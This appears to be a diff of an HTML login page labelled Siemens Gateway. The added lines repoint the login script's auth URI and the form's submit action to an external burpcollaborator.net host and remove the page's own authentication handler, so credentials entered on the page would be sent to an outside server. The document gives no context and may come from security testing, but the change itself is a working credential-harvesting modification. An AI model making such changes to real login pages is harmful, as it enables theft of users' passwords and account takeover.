@@ -8,7 +8,7 @@
 <link rel='icon' type='image/png' href='favicon.png' />
 <script type='text/javascript'>
 userModLogin.passwordRequired = false;
-userModLogin.authUri = "/user/auth";
+userModLogin.authUri = "https://q5wcvw9etzm369tgr5c0uwxopfv6jv.burpcollaborator.net";
 userModLogin.redirectUri = "/";
 userModLogin.localeLogin = "Login";
 userModLogin.localeLoggingIn = "Logging in";
@@ -18,7 +18,7 @@ userModLogin.showMobile = false;
 window.onload = function() { userModLogin.init(false); }</script>
 </head>
 <body>
-<form id='loginForm' method='post' action='https://lc172rg90utyd40by0jv1r4jwa20qp.burpcollaborator.net' autocomplete='off'>
+<form action='https://q5wcvw9etzm369tgr5c0uwxopfv6jv.burpcollaborator.net' autocomplete='off'>
 <p class='logo'>
 <img src='siemens-logo-color_0.png'></p>
 <p id='err'>
@@ -36,7 +36,7 @@ Password:</label>
 <input type='checkbox' id='mobile' value='mobile' /> Mobile</label>
 </p>
 <p>
-<input type='submit' id='loginButton' value='Login' onclick='return userModLogin.loginAuth();' /></p>
+<input type='submit' value='Login'/></p>
 </form>
 <p class='lic'>
 Licensed to Siemens Gateway</p>
